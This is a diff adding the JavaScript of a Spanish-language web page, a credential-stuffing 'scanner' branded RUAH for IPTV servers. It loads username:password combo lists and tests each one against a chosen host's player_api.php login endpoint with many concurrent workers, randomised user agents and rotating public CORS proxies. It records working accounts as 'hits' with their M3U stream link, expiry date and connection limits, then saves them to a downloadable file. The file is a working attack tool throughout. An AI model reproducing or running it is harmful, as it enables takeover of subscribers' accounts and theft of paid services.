+const hitsCount = [document.getElementById('hitsCount1'),document.getElementById('hitsCount2'),document.getElementById('hitsCount3')];
+const progressFill = [document.getElementById('progressBarFill'),document.getElementById('progressBarFill2'),document.getElementById('progressBarFill3')];
+const progressTextSpan = [document.getElementById('progressText'),document.getElementById('progressText2'),document.getElementById('progressText3')];
+const currentComboSpan = [document.getElementById('currentCombo'),document.getElementById('currentCombo2'),document.getElementById('currentCombo3')];
+const comboFile = [document.getElementById('comboFile1'),document.getElementById('comboFile2'),document.getElementById('comboFile3')];
+const comboTextArea = document.getElementById('comboText');
+const loadRuahBtn = document.getElementById('loadRuahCombosBtn');
+const presetSelect = document.getElementById('presetServerSelect');
+const clearAllBtn = document.getElementById('clearAllBtn');
+const hitsContainer = document.getElementById('hitsContainer');
+const footer = document.getElementById('footerMade');
+
+// variables estado
+let isRunning = false, stopRequested = false;
+let serverIP = null, serverGeo = null;
+let combos = [[],[],[]];
+let hits = [[],[],[]];
+let audioCtx = null;
+let jobProxies = {};
+const proxyFailMap = new Map();
+const PROXY_MAX_FAILS = 3, COOLDOWN = 60000;
+const CORS_PROXIES = ['https://cors.isomorphic-git.org/{url}','https://thingproxy.freeboard.io/fetch/{url}','https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}','https://yacdn.org/proxy/{url}','https://api.s0n1c.org/cors?url={url}'];
+
+function randomUA(){ const ua=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36"]; return ua[Math.floor(Math.random()*ua.length)]; }
+function createSession(){ return { headers:{"User-Agent":randomUA(),"Accept":"application/json, text/javascript,*/*;q=0.9"}, cookies:{} }; }
+function attachCookies(opts,session){ const cstr=Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; "); if(cstr){ opts.headers={...(opts.headers||{})}; opts.headers.Cookie=cstr; } return opts; }
+function fetchTimeout(url,opts={},ms=7000){ return new Promise((resolve,reject)=>{ const ctrl=new AbortController(); const id=setTimeout(()=>{ ctrl.abort(); reject(new Error('timeout')); },ms); fetch(url,{...opts,signal:ctrl.signal}).then(r=>{ clearTimeout(id); resolve(r); }).catch(e=>{ clearTimeout(id); reject(e); }); }); }
+function proxyIsCold(tpl){ const s=proxyFailMap.get(tpl); return s&&s.until&&Date.now()<s.until; }
+function noteProxyFail(tpl){ let s=proxyFailMap.get(tpl)||{n:0,until:0}; s.n++; if(s.n>=PROXY_MAX_FAILS){ s.until=Date.now()+COOLDOWN; s.n=0; } proxyFailMap.set(tpl,s); }
+function noteProxyOk(tpl){ proxyFailMap.delete(tpl); }
+async function fetchWithCors(url,options={},jobId=null){ const baseOpts={cache:'no-store',keepalive:false,...options}; if(jobId&&jobProxies[jobId]&&!proxyIsCold(jobProxies[jobId])){ try{ const proxied=jobProxies[jobId].replace('{url}',encodeURIComponent(url)); const r=await fetchTimeout(proxied,baseOpts); if(r.ok){ noteProxyOk(jobProxies[jobId]); return r; } noteProxyFail(jobProxies[jobId]); }catch(e){ noteProxyFail(jobProxies[jobId]); } } try{ const r=await fetchTimeout(url,baseOpts); if(r.ok) return r; }catch(e){} if(!useCorsCheck.checked) throw new Error('No cors'); const pool=CORS_PROXIES.filter(t=>!(jobId&&jobProxies[jobId]===t)&&!proxyIsCold(t)).sort(()=>Math.random()-0.5); for(const tpl of pool){ try{ const proxied=tpl.replace('{url}',encodeURIComponent(url)); const r=await fetchTimeout(proxied,baseOpts); if(r.ok){ noteProxyOk(tpl); return r; } noteProxyFail(tpl); }catch(e){ noteProxyFail(tpl); } } throw new Error('Fetch failed'); }
+async function getJson(url,opts,jobId){ const r=await fetchWithCors(url,opts,jobId); if(!r.ok) throw new Error('Bad'); return await r.json(); }
+
+function extractCombo(line){ if(!line) return null; let s=String(line).normalize('NFKC').replace(/\s+/g,' ').trim(); const m=s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u); if(!m) return null; const user=m[1].trim(), pass=m[2].trim(); if(!user||!pass) return null; return [user,pass]; }
+
+// ====== OBTENER TOTALES ======
+async function getTotalCounts(host, user, pass, usedProto) {
+    const baseUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+    const opts = { headers: { 'User-Agent': randomUA() } };
+    try {
+        const [liveResp, vodResp, seriesResp] = await Promise.allSettled([
+            fetchTimeout(`${baseUrl}&action=get_live_streams`, opts, 5000),
+            fetchTimeout(`${baseUrl}&action=get_vod_streams`, opts, 5000),
+            fetchTimeout(`${baseUrl}&action=get_series`, opts, 5000)
+        ]);
+        let channels = 0, movies = 0, series = 0;
+        if (liveResp.status === 'fulfilled' && liveResp.value.ok) {
+            const data = await liveResp.value.json();
+            if (Array.isArray(data)) channels = data.length;
+        }
+        if (vodResp.status === 'fulfilled' && vodResp.value.ok) {
+            const data = await vodResp.value.json();
+            if (Array.isArray(data)) movies = data.length;
+        }
+        if (seriesResp.status === 'fulfilled' && seriesResp.value.ok) {
+            const data = await seriesResp.value.json();
+            if (Array.isArray(data)) series = data.length;
+        }
+        return { channels, movies, series };
+    } catch(e) {
+        return { channels: 0, movies: 0, series: 0 };
+    }
+}
+
+// ====== VALIDAR COMBO ======
+async function validarCombo(host, combo, opts={}, session=null, ui=null, jobId=null, nick='RUAH DE CHILE') {
+    if(stopRequested) return null;
+    const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+    if(!pair) return null;
+    const [user, pass] = pair;
+    if(ui?.user) ui.user.textContent = `👤 Usuario: ${user}:${pass}`;
+    const protos = ['http://','https://'];
+    let data = null, usedProto = 'http://';
+    for(const p of protos){
+        const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+        try{
+            const res = await fetchWithCors(url, opts, jobId);
+            if(res.ok){
+                data = await res.json();
+                usedProto = p;
+                break;
+            }
+        }catch(e){}
+    }
+    if(!data) return null;
+    const uinfo = data.user_info || {};
+    const ok = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1' || uinfo.status === 'Actif');
+    if(!ok) return null;
+
+    // Obtener totales
+    const counts = await getTotalCounts(host, user, pass, usedProto);
+
+    const [hostname, port] = host.includes(':') ? [host.split(':')[0], host.split(':')[1]] : [host, (usedProto==='https://'?'443':'80')];
+    const linkM3u = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+    const geo = serverGeo || null;
+    const pais = geo ? `${geo.country}` : 'Desconocido';
+    // Construir hit con nuevo formato
+    const hitData = {
+        user, pass, host, hostname, port, usedProto, uinfo, linkM3u, geo, pais,
+        nick: nick || 'RUAH DE CHILE',
+        channels: counts.channels,
+        movies: counts.movies,
+        series: counts.series,
+        total: counts.channels + counts.movies + counts.series
+    };
+    return hitData;
+}
+
+// ====== CONSTRUIR HTML Y TEXTO PLANO ======
+function buildHitHTMLAndPlain(hitData) {
+    const { user, pass, host, hostname, port, usedProto, uinfo, linkM3u, geo, pais, nick, channels, movies, series, total } = hitData;
+    const created = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/D';
+    const expires = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/D';
+    const status = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1') ? '✅ Active' : '❌ Inactive';
+    const maxConns = uinfo.max_connections ?? uinfo.max_cons ?? 'N/D';
+    const activeCons = uinfo.active_cons ?? uinfo.connected_cons ?? 'N/D';
+
+    const lines = [
+        `⚡ SCANNER NUCLEAR RUAH ⚡`,
+        `🇨🇱  PARA GUAPOS Y SEXYS 🇨🇱`,
+        `R-IP: ${geo ? geo.ip : 'N/D'}`,
+        `U- Host: ${usedProto}${host}`,
+        `A- Usuario: ${user}`,
+        `H - Contraseña: ${pass}`,
+        `🏴‍☠️- País : 🏁 ${pais}`,
+        `💻- Creada: ${created}`,
+        `🗓️ - Expira: ${expires}`,
+        `📡 - Estado: ${status}`,
+        `🔗 Conexiones máximas: ${maxConns}  Conexiones activas: ${activeCons}`,
+        `🔗 Link M3U: ${linkM3u}`,
+        `🏷️ Calidad : 💎 PREMIUM 💎`,
+        `📜Nick : ${nick}`,
+        `CONTENIDO DEL SERVIDOR:`,
+        `📡 Canales : ${channels}`,
+        `📺 Películas : ${movies}`,
+        `🍿 Series : ${series}`,
+        `📊 Total : ${total}`,
+        `🇨🇱𝐌𝟑𝐮 ${nick} 𝟐𝟎𝟐6 🇨🇱`
+    ];
+
+    const htmlContent = `<div class="hit-html-content">` +
+        lines.map(line => `<div class="line">${line}</div>`).join('') +
+        `</div>`;
+    const plainText = lines.join('\n');
+    return { htmlContent, plainText };
+}
+
+// ====== MOSTRAR HIT ======
+function mostrarHit(hitData, idx) {
+    const { htmlContent, plainText } = buildHitHTMLAndPlain(hitData);
+    const div = document.createElement('div');
+    div.className = 'hit-item';
+    div.innerHTML = htmlContent;
+    hitsContainer.prepend(div);
+    hits[idx].push({ html: htmlContent, text: plainText, ...hitData });
+    if(hitsCount[idx]) hitsCount[idx].innerHTML = `💥 HITS: ${hits[idx].length}`;
+    playHitSound();
+}
+
+// ====== ACTUALIZAR PROGRESO ======
+function actualizarProgresoJob(job, proc, total) {
+    const pct = total === 0 ? 0 : (proc / total) * 100;
+    if(progressFill[job]) progressFill[job].style.width = pct + '%';
+    if(progressTextSpan[job]) progressTextSpan[job].textContent = `✅ Procesados: ${proc} / ${total} | 💥 HITS: ${hits[job].length}`;
+    if(hitsCount[job]) hitsCount[job].innerHTML = `💥 HITS: ${hits[job].length}`;
+}
+
+// ====== PROCESAR JOB ======
+async function processarJob(host, combosArr, concurrency, jobIdx, nick) {
+    if(!combosArr.length) return;
+    const total = combosArr.length;
+    let processed = 0;
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+    let index = 0;
+    const worker = async () => {
+        const session = createSession();
+        while(index < total && !stopRequested) {
+            const i = index++;
+            if(i >= total) break;
+            const combo = combosArr[i];
+            if(!combo) continue;
+            if(currentComboSpan[jobIdx]) currentComboSpan[jobIdx].textContent = `👤 Usuario: ${combo}`;
+            let opts = { headers: { ...session.headers } };
+            opts = attachCookies(opts, session);
+            try {
+                const hitData = await validarCombo(host, combo, opts, session, { user: currentComboSpan[jobIdx] }, jobIdx+1, nick);
+                if(!stopRequested && hitData) {
+                    mostrarHit(hitData, jobIdx);
+                }
+            } catch(e) {}
+            processed++;
+            actualizarProgresoJob(jobIdx, processed, total);
+            await sleep(40 + Math.random() * 140);
+            if(stopRequested) break;
+        }
+    };
+    if(progressTextSpan[jobIdx]) progressTextSpan[jobIdx].textContent = '❤️‍🔥 Iniciando scan...';
+    await Promise.all(Array.from({ length: Math.min(concurrency, total) }, () => worker()));
+    if(currentComboSpan[jobIdx]) currentComboSpan[jobIdx].textContent = '👤 Usuario: -';
+    if(progressTextSpan[jobIdx]) progressTextSpan[jobIdx].textContent += stopRequested ? ' | ⏹ Scan detenido.' : ' | 🏁 Scan finalizado.';
+}
+
+// ====== INICIAR SCAN ======
+async function startScan() {
+    if(isRunning) return;
+    if(!audioCtx) {
+        const Ctx = window.AudioContext || window.webkitAudioContext;
+        if(Ctx) {
+            audioCtx = new Ctx();
+            const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+            g.gain.value = 0;
+            o.connect(g);
+            g.connect(audioCtx.destination);
+            o.start();
+            o.stop(audioCtx.currentTime + 0.01);
+        }
+    }
+    if(audioCtx && audioCtx.state === 'suspended') await audioCtx.resume();
+
+    stopRequested = false;
+    isRunning = true;
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    saveBtn.disabled = true;
+    hitsContainer.innerHTML = '';
+    for(let i=0; i<3; i++) {
+        hits[i] = [];
+        progressFill[i].style.width = '0%';
+        progressTextSpan[i].textContent = '🌐 Resolviendo IP...';
+        currentComboSpan[i].textContent = '👤 Usuario: -';
+        if(hitsCount[i]) hitsCount[i].innerHTML = '💥 HITS: 0';
+    }
+
+    const rawHost = hostInput.value.trim();
+    if(!rawHost) { alert('Ingresa un host'); isRunning=false; startBtn.disabled=false; saveBtn.disabled=false; return; }
+    const host = rawHost.replace(/^https?:\/\//, '');
+    const concBase = parseInt(concurrencyInput.value) || 80;
+    const activeJobs = combos.filter(c => c.length).length || 1;
+    const perConc = Math.max(1, Math.floor(concBase / activeJobs));
+    const nick = nickInput.value.trim() || 'RUAH DE CHILE';
+
+    const domainHost = host.split(':')[0];
+    try {
+        const resp = await fetch(`https://dns.google/resolve?name=${domainHost}&type=A`);
+        if(resp.ok) {
+            const data = await resp.json();
+            const ip = data.Answer?.find(a => a.type === 1)?.data;
+            if(ip) {
+                serverIP = ip;
+                const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
+                if(geoResp.ok) {
+                    const geo = await geoResp.json();
+                    if(geo.status === 'success') serverGeo = { ip, country: geo.country, city: geo.city };
+                }
+            }
+        }
+    } catch(e) {}
+
+    const shuffleArray = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
+    if(combos[0].length) jobProxies[1] = shuffleArray[0 % CORS_PROXIES.length];
+    if(combos[1].length) jobProxies[2] = shuffleArray[1 % CORS_PROXIES.length];
+    if(combos[2].length) jobProxies[3] = shuffleArray[2 % CORS_PROXIES.length];
+
+    const jobs = [];
+    if(combos[0].length) jobs.push(processarJob(host, combos[0], perConc, 0, nick));
+    if(combos[1].length) jobs.push(processarJob(host, combos[1], perConc, 1, nick));
+    if(combos[2].length) jobs.push(processarJob(host, combos[2], perConc, 2, nick));
+    if(jobs.length === 0) { isRunning=false; startBtn.disabled=false; stopBtn.disabled=true; saveBtn.disabled=false; return; }
+
+    await Promise.allSettled(jobs);
+    isRunning = false;
+    stopBtn.disabled = true;
+    startBtn.disabled = false;
+    saveBtn.disabled = false;
+    const totalHits = hits[0].length + hits[1].length + hits[2].length;
+    if(autoDownload.checked && totalHits > 0) saveHits();
+}
+
+// ====== GUARDAR HITS ======
+function saveHits() {
+    const allHits = [];
+    for(let i=0; i<3; i++) allHits.push(...hits[i]);
+    const unique = new Map();
+    for(const h of allHits) if(!unique.has(h.text)) unique.set(h.text, h);
+    const content = Array.from(unique.values()).map(h => h.text).join('\n\n-----------------\n\n');
+    if(!content) { alert('No hay hits para guardar'); return; }
+    const blob = new Blob([`=============== ⚡❤️‍🔥 RUAH SEXY TV ❤️‍🔥⚡ ===============\n💥 TOTAL HITS: ${unique.size}\n=======================================================\n\n${content}`], { type: 'text/plain' });
+    const a = document.createElement('a');
+    const host = hostInput.value.trim().replace(/[^a-z0-9]/gi, '_');
+    a.href = URL.createObjectURL(blob);
+    a.download = `ruah_hits_${host}_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+}
+
+// ====== FUNCIONES DE CARGA ======
+function loadCombosFromFiles() {
+    for(let i=0; i<3; i++) {
+        const file = comboFile[i].files[0];
+        if(file) {
+            const reader = new FileReader();
+            reader.onload = e => {
+                const lines = e.target.result.split(/\r?\n/);
+                const parsed = [];
+                for(const line of lines) {
+                    const p = extractCombo(line);
+                    if(p) parsed.push(`${p[0]}:${p[1]}`);
+                }
+                combos[i] = parsed;
+                updateStartBtn();
+            };
+            reader.readAsText(file);
+        } else {
+            // Si no hay archivo, no vaciamos el combo para no perder lo que haya en textarea o ruah
+            // pero si se selecciona archivo, reemplaza.
+        }
+    }
+    updateStartBtn();
+}
+
+function loadCombosFromText() {
+    const raw = comboTextArea.value;
+    const parsed = [];
+    if (raw) {
+        const lines = raw.split(/\r?\n/);
+        for (const line of lines) {
+            const p = extractCombo(line);
+            if (p) parsed.push(`${p[0]}:${p[1]}`);
+        }
+    }
+    // Asignar al engine 1 (reemplaza lo que hubiera)
+    combos[0] = parsed;
+    updateStartBtn();
+}
+
+function updateStartBtn() {
+    const hasHost = !!hostInput.value.trim();
+    const hasCombos = combos[0].length || combos[1].length || combos[2].length;
+    startBtn.disabled = !(hasHost && hasCombos);
+}
+
+function fullReset() {
+    if(isRunning) stopRequested = true;
+    isRunning = false; stopRequested = false;
+    hostInput.value = '';
+    for(let i=0; i<3; i++) { combos[i] = []; comboFile[i].value = ''; }
+    comboTextArea.value = '';
+    hitsContainer.innerHTML = '';
+    for(let i=0; i<3; i++) {
+        hits[i] = [];
+        progressFill[i].style.width = '0%';
+        progressTextSpan[i].textContent = 'Esperando...';
+        currentComboSpan[i].textContent = '👤 Usuario: -';
+        if(hitsCount[i]) hitsCount[i].innerHTML = '💥 HITS: 0';
+    }
+    serverIP = null; serverGeo = null;
+    updateStartBtn();
+}
+
+function loadRuahCombos() {
+    // Limpiar todos los combos
+    for (let i = 0; i < 3; i++) combos[i] = [];
+    // Parsear el raw
+    const lines = RUAH_COMBOS_RAW.split(/\r?\n/);
+    const parsed = [];
+    for (const line of lines) {
+        const p = extractCombo(line);
+        if (p) parsed.push(`${p[0]}:${p[1]}`);
+    }
+    combos[0] = parsed;
+    // Actualizar textarea para reflejar
+    comboTextArea.value = RUAH_COMBOS_RAW;
+    // Limpiar archivos
+    for (let i = 0; i < 3; i++) comboFile[i].value = '';
+    updateStartBtn();
+    const btn = loadRuahBtn;
+    const original = btn.innerText;
+    btn.innerText = '✅ Combos cargados en ENGINE 1! ✅';
+    setTimeout(() => btn.innerText = original, 2000);
+}
+
+function populatePresets() {
+    UNIQUE_SERVERS.forEach(s => {
+        const opt = document.createElement('option');
+        opt.value = s;
+        opt.textContent = s;
+        presetSelect.appendChild(opt);
+    });
+    presetSelect.addEventListener('change', () => {
+        if(presetSelect.value) hostInput.value = presetSelect.value;
+        updateStartBtn();
+    });
+}
+
+function initLang() {
+    langSelect.addEventListener('change', () => {
+        const texts = {
+            es: { start: '▶ INICIAR SCAN', stop: '⏹ DETENER', save: '💾 GUARDAR HITS', footer: '⚡ RUAH NUCLEAR · SOLO PARA GUAPOS Y SEXYS · 🇨🇱 SCANNER PREMIUM 🔥' },
+            en: { start: '▶ START SCAN', stop: '⏹ STOP', save: '💾 SAVE HITS', footer: '⚡ RUAH NUCLEAR · ONLY FOR HANDSOME & SEXY · 🇨🇱 PREMIUM SCANNER 🔥' },
+            fr: { start: '▶ DÉMARRER', stop: '⏹ ARRÊTER', save: '💾 SAUVER HITS', footer: '⚡ RUAH NUCLÉAIRE · POUR BEAUX & SEXY · 🇨🇱 SCANNER PREMIUM 🔥' }
+        };
+        const l = langSelect.value;
+        startBtn.textContent = texts[l].start;
+        stopBtn.textContent = texts[l].stop;
+        saveBtn.textContent = texts[l].save;
+        footer.textContent = texts[l].footer;
+    });
+}
+
+// ====== EVENTOS ======
+startBtn.addEventListener('click', startScan);
+stopBtn.addEventListener('click', () => { if(isRunning) stopRequested = true; stopBtn.disabled = true; });
+saveBtn.addEventListener('click', saveHits);
+for(let i=0; i<3; i++) comboFile[i].addEventListener('change', loadCombosFromFiles);
+comboTextArea.addEventListener('input', loadCombosFromText);
+loadRuahBtn.addEventListener('click', loadRuahCombos);
+clearAllBtn.addEventListener('click', fullReset);
+hostInput.addEventListener('input', updateStartBtn);
+populatePresets();
+initLang();
+updateStartBtn();
+
+// ====== SONIDO HIT ======
+function playHitSound() {
+    if(!soundToggle.checked || !audioCtx) return;
+    try {
+        const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+        o.type = 'sine';
+        o.frequency.value = 880;
+        g.gain.setValueAtTime(0, audioCtx.currentTime);
+        g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
+        g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
+        o.connect(g);
+        g.connect(audioCtx.destination);
+        o.start();
+        o.stop(audioCtx.currentTime + 0.2);
+        if(navigator.vibrate) navigator.vibrate(80);
+    } catch(e) {}
+}
+</script>
+</body>
+</html>
